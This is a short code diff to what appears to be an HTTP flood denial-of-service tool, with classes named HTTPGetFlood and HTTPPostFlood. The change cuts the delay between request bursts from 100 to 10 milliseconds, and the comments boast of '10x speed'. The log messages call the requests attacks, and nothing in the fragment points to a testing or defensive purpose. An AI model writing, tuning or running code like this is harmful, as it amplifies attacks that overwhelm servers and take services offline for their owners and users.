@@ -149,7 +149,7 @@ export class HTTPGetFlood {
                     makeRequest();
                 }
 
-                setTimeout(resolve, 100);
+                setTimeout(resolve, 10); // Reduced from 100ms to 10ms for 10x speed!
             } catch (err) {
                 logger.debug(`Attack request error: ${err.message}`);
                 resolve();
@@ -236,7 +236,7 @@ export class HTTPPostFlood extends HTTPGetFlood {
                     makeRequest();
                 }
 
-                setTimeout(resolve, 100);
+                setTimeout(resolve, 10); // Reduced from 100ms to 10ms for 10x speed!
             } catch (err) {
                 logger.debug(`POST attack error: ${err.message}`);
                 resolve();
